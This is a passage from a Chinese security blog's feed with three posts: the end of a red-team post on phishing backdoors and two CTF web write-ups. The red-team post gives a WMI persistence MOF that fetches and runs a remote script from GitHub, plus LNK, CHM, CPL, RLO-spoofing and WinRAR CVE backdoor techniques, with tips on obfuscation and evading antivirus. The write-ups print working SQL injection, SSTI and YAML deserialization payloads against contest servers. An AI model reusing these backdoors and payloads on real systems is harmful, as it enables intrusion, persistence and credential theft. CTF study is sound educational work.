  Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consP1&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText = &quot;GetObject(\&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\&quot;)&quot;;</span><br><span class="line">&#125;;    </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>类似的，也可以利用wmi执行其他后门程序，配合使用</p><p>具体的可以看这篇<br><a href="http://www.anquan.us/static/drops/tips-8260.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-8260.html</a></p><p>同时wmi也可使用 </p><blockquote><p>vbs<br>mof<br>C / C++<br>.Net<br>等方式进行执行 </p></blockquote><h2 id="0x05-Lnk-Backdoor"><a href="#0x05-Lnk-Backdoor" class="headerlink" title="0x05 Lnk Backdoor"></a>0x05 Lnk Backdoor</h2><p>可参考evi1cg师傅的文章-&gt;<a href="https://evi1cg.me/archives/Shortcut_Backdoor.html" target="_blank" rel="noopener">Shortcut_Backdoor</a><br>快捷方式会执行目标里的文件<br><img src="/Phishing Attack - 文件落地.resources/7092550A-0CF0-42AE-96C7-E41A769063B2.png" alt="e6661303d9cae03727399d7ada045593"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shortcut_gen.exe test.txt test.lnk</span><br></pre></td></tr></table></figure><p>这样点击test.lnk 就会执行test.txt中的命令</p><p>也可以使用evi1cg师傅的脚本-&gt;<a href="https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329" target="_blank" rel="noopener">https://gist.github.com/Ridter/a360f94d8ac9a8c30227e3812dfbb329</a></p><h2 id="0x06-Chm-Backdoor"><a href="#0x06-Chm-Backdoor" class="headerlink" title="0x06 Chm Backdoor"></a>0x06 Chm Backdoor</h2><p>通用以上 #利用 CHM 加载 JS<br>不单可利用JS进行执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>利用Object标签，可执行各类shellcode<br>比如利用regsvr32 执行dll，利用mshta执行hta，直接运行powershell，VBS等等<br>前提当然是做好混淆和免杀</p><h2 id="0x07-CPL-Backdoor"><a href="#0x07-CPL-Backdoor" class="headerlink" title="0x07 CPL Backdoor"></a>0x07 CPL Backdoor</h2><p>CPL (Control Panel Item)<br>CPL文件本质上是DLL， 但是由于他包含CPLApplet函数，所以成为了一个windows可执行文件<br>但是虽然是可执行文件，其实是调用shell32.dll 来运行<br>调用的几种方式:</p><p><strong>利用vbs调用cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim obj</span><br><span class="line">Set obj = CreateObject(&quot;Shell.Application&quot;)</span><br><span class="line">obj.ControlPanelItem(&quot;test.cpl&quot;)</span><br></pre></td></tr></table></figure></p><p><strong>利用js调用cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = new ActiveXObject(&quot;Shell.Application&quot;);</span><br><span class="line">a.ControlPanelItem(&quot;c:\\test\\test.cpl&quot;);</span><br></pre></td></tr></table></figure></p><p>同样，其实可以直接用msf生成一个dll文件，然后修改后缀为.cpl即可，但是存在一个弹窗提示程序兼容性问题<br>解决方式：手动编译reverse_tcp</p><p>参考：<a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-16042.html</a></p><h2 id="0x08-Windows-利用Unicode-文件名反转"><a href="#0x08-Windows-利用Unicode-文件名反转" class="headerlink" title="0x08 Windows 利用Unicode 文件名反转"></a>0x08 Windows 利用Unicode 文件名反转</h2><p>相当简单..<br><img src="/Phishing Attack - 文件落地.resources/0BB5918F-F0DC-4CED-B0BE-56F421ABA477.png" alt="723d43d4d266bfe5a3c58768d476d090"></p><p>插入RLO字符就可以进行文件名反转，然后可以换图片来更好的伪装<br><img src="/Phishing Attack - 文件落地.resources/76864B14-46A1-4586-BC1E-2A104295BA7C.png" alt="5633fd5aa8a0e32749abe83665490e9c"></p><h2 id="0x09-Winrar-Backdoor"><a href="#0x09-Winrar-Backdoor" class="headerlink" title="0x09 Winrar Backdoor"></a>0x09 Winrar Backdoor</h2><p>著名的<code>CVE-2018-20250</code><br>还没分析过原理..献上学长的Exp<br><a href="https://github.com/WyAtu/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250</a></p><h2 id="0x10-CVE-2018-4878"><a href="#0x10-CVE-2018-4878" class="headerlink" title="0x10 CVE-2018-4878"></a>0x10 CVE-2018-4878</h2><p>影响版本：<br><code>version &lt;= 28.0.0.137</code><br>flask 溢出，配合脚本进行攻击就行..现在h5盛行，flash也快退休了</p><h2 id="0x11-Nginx-反向代理"><a href="#0x11-Nginx-反向代理" class="headerlink" title="0x11 Nginx 反向代理"></a>0x11 Nginx 反向代理</h2><p>推一波passer6y<br><a href="https://www.anquanke.com/post/id/150436" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150436</a><br>大概就是注册一个相近的域名，然后反代真实服务器，截断明文密码，进行钓鱼，单独分析一波  # Nginx 反向代理实战</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-07-18 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[39567]Good Morning-54191467.png&quot; alt&gt;&lt;br&gt;[toc]&lt;br&gt;鱼
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019-西南赛区部分Web题解</title>
    <link href="http://patrilic.top/2019/06/10/CISCN2019-%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%83%A8%E5%88%86Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://patrilic.top/2019/06/10/CISCN2019-西南赛区部分Web题解/</id>
    <published>2019-06-10T07:08:02.000Z</published>
    <updated>2019-08-20T15:27:04.138Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-06-10 15:08:02<br>拿了个第四..师傅们tql，没想到纯Web队伍也有翻身的一天（滑稽）<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/931F982B33E8B1040822716BDAFA42EE.jpg" alt="931f982b33e8b1040822716bdafa42ee"></p></blockquote><h2 id="Ciscn-q07"><a href="#Ciscn-q07" class="headerlink" title="Ciscn-q07"></a>Ciscn-q07</h2><p>先注册一个admin’# 的账号然后直接文件上传<br>直接传php(不用&lt;?php)<br>改mime为image/jpeg就getshell了..<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/071.png" alt="4d80f49d47825ccd9aca1330a124636c"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/072.png" alt="913690845a8e92d1ab10a77737894477"></p><p>判定了一个admin的权限</p><h2 id="Ciscn-q09"><a href="#Ciscn-q09" class="headerlink" title="Ciscn-q09"></a>Ciscn-q09</h2><p>注册用户登陆的时候，发现存在sql注入<br>登陆进去之后发现注释有提示，存在admin的账号，注册一个用户名为下面的账号，登陆即可注入admin的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;&amp;amp;&amp;amp; extractvalue(1,concat(0x7e,(select `3` from (select 1,2,3 union select * from user)a limit 1,1)))#</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/091.png" alt="19cd6150c405f77f4e70098b9a9ff4f7"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/092.png" alt="f94276c29af45e7fc2928bcbe9248541"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/093.png" alt="86a8390a6baa79d4ccaa682ae02d91cb"></p><p>用admin的账号和密码登陆提示orange的SSRF，可控url就是bug反馈</p><p>携带cookie去请求flag.php即可获得flag<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/094.png" alt="9142fc4e44be8a5d61cde6519fdbf26e"></p><h2 id="Ciscn-8"><a href="#Ciscn-8" class="headerlink" title="Ciscn 8"></a>Ciscn 8</h2><p>URL：172.16.9.18<br>看着有计算功能，并且是PY，直接想SSTI，试了下 2<br>得到输出结果为2，确定了SSTI<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/123.png" alt="3a65fa54c411da804acc98652f208834"></p><p>然后就是用payload了，不过测试过程中发现了两个过滤的点 一个是括号，一个是open字符串，不过都可以用双写来绕过 括号只是单独的括号就会被置换为空，如果里面有字符的话就不会置换为空 比如 () 要用 (()) 绕， open 要用 opopenen 绕<br>于是最终的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/111.png" alt="4ef955d4f8a6198ac47c9f39365b480c"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/112.png" alt="65c4176a3f67c25b3beafaad2432027a"></p><h2 id="Ciscn-10"><a href="#Ciscn-10" class="headerlink" title="Ciscn 10"></a>Ciscn 10</h2><p>URL： 172.16.9.20<br>点击忘记密码<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/3.png" alt="454b911c60722c999e150395e4fbcbab"></p><p>修改后可直接登录admin<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/图片 2.png" alt="5ce1c580d29d7c882b2e34f59ff2885f"></p><p>猜测yaml命令执行<br>执行ls结果<br> Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!map &#123;</span><br><span class="line">? !!str &quot;goodbye&quot;</span><br><span class="line">: !!python/object/apply:subprocess.check_output [</span><br><span class="line">!!str &quot;ls&quot;,],&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/图片 1.png" alt="1349a5aa45787c9df811b7ae787084f4"></p><p>准备构造payload 进行cat /flag时发现别人上传了5.yml<br>直接访问即可：<br> flag{81595b84-317b-434a-b45f-6aea2c37722c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-06-10 15:08:02&lt;br&gt;拿了个第四..师傅们tql，没想到纯Web队伍也有翻身的一天（滑稽）&lt;br&gt;&lt;img src=&quot;/CISCN2019 -西南赛区分区赛Web题解.
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>QWB2019 Web -随便注（题解）</title>
    <link href="http://patrilic.top/2019/06/05/QWB2019%20Web%20-%E9%9A%8F%E4%BE%BF%E6%B3%A8%EF%BC%88%E9%A2%98%E8%A7%A3%EF%BC%89/"/>
    <id>http://patrilic.top/2019/06/05/QWB2019 Web -随便注（题解）/</id>
    <published>2019-06-05T12:59:32.000Z</published>
    <updated>2019-08-20T15:28:04.484Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-06-05 20:59:32<br><img src="/wallpaper/[41576]「　ねぇ、」-64710934.jpg" alt><br>很少遇到使用 <strong>mysqli_multi_query()</strong> 的题目，做个记录</p></blockquote><p>概率论使我憔悴</p><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>打开题目，就一个&lt;input>标签，随便输一个数字，burp抓一下<br><img src="/QWB2019 Web -随便注（题解）.resources/225795EF-A32C-497C-967D-C6AED199E73A.png" alt="a9bba15b8d47ba4edea294709f323bc5"></p><p>感觉是一般的select语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">data</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span> = &#123;$inject&#125;</span><br></pre></td></tr></table></figure></p><p>测一下过滤情况<br>随便输入一个<img src="/QWB2019 Web -随便注（题解）.resources/893B07F7-8A30-4FBD-923D-3203BF85F508.png" alt="0535bce1ced6095c073ded1c06110095"><br>爆出过滤情况<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure></p><p>尝试一波extractvalue(),无果..</p><p>然后就在测试一些常用的情况，类似于<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((substr(user(),1,1)&gt;'a'),sleep(5),1);</span><br></pre></td></tr></table></figure></p><p>后来@hpdoger告诉我说可以堆叠查询..<br>于是乎..<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -随便注（题解）.resources/C6C08A11-B19B-49EC-AECC-E88D6846C07A.png" alt="e77b6cef87b97ccf9d695c4f36dd2fe2"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -随便注（题解）.resources/F4ECA2ED-A838-4A75-BA6B-5ED93136DB3E.png" alt="acde9a6b7ba360dbb9e0404f47a48a1c"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">describe</span><span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -随便注（题解）.resources/B102EE66-34F1-4FB9-8098-65E35EB32CA3.png" alt="6bcd5a04abba3759bc0d190a82b550ce"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'version'</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -随便注（题解）.resources/5F55DDD1-4E28-46C6-8EE2-B3F9C8C8F00A.png" alt="9a2a58383e535d53cc886c3078bfbe33"></p><p>所以现在的信息就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: supersqli</span><br><span class="line">table: 1919810931114514</span><br><span class="line">column: flag</span><br><span class="line">version: 10.0.27-MariaDB-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure></p><p>然后还有个好玩的：<br>查看grant的时候: ;SHOW GRANTS FOR CURRENT_USER()<br><img src="/QWB2019 Web -随便注（题解）.resources/BD7CB99F-9E59-45B0-9AF7-1AE8E74158DC.png" alt="f7c19dd203bc1755b0d46759e09f93c7"></p><p>现在目标明确，就是要<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="number">191981093111414</span></span><br></pre></td></tr></table></figure></p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>利用set将<strong>select flag from 1919810931114514</strong>写入变量@patrilic中，利用prepare将变量设置为预处理，然后再execute</p><p>主要可以bypass掉select，用char()函数带入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @patrilic=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">32</span>),<span class="number">1919810931114514</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -随便注（题解）.resources/868A3AB6-CFD4-4B93-8ACF-7FD92F44A6C6.png" alt="f30557894cf438c4e47146a0cb3bbc45"></p><p>然后直接执行即可.<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23</span><br></pre></td></tr></table></figure></p><p>参考:<br><a href="https://blog.csdn.net/qq_42030417/article/details/80372800" target="_blank" rel="noopener">https://blog.csdn.net/qq_42030417/article/details/80372800</a></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>利用mysql::handler<br><img src="/QWB2019 Web -随便注（题解）.resources/44DCE71B-290D-4DF1-BF78-8CA825633D9F.png" alt="078ec36715ece7186ada02a51ac1f367"></p><p>也可使用别名<br><img src="/QWB2019 Web -随便注（题解）.resources/6F664750-5A87-498E-9790-42EC62EAE0F3.png" alt="5e65dda79fc38e997716d9f5139dc88a"></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23</span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="https://dev.mysql.com/doc/refman/5.7/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a><br><a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p><h2 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h2><p>… </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-06-05 20:59:32&lt;br&gt;&lt;img src=&quot;/wallpaper/[41576]「　ねぇ、」-64710934.jpg&quot; alt&gt;&lt;br&gt;很少遇到使用 &lt;strong&gt;m
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
</feed>
